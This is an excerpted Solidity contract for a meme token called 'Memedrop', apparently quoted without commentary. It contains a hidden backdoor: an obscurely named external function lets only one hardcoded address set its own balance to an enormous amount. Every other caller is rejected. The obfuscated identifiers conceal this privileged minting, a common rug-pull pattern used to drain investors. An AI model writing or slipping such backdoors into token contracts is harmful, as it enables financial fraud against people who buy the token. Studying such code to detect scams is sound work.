...
contract MEMEToken is Ownable {
    ...
    function pepepogAdddmmm() external {
        ...
        if (_cwojakpepe31!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe31 == tswojaks){
            _balances[_cwojakpepe31] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe31 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "Memedrop";
    string _symbol = "MEMEDROP";
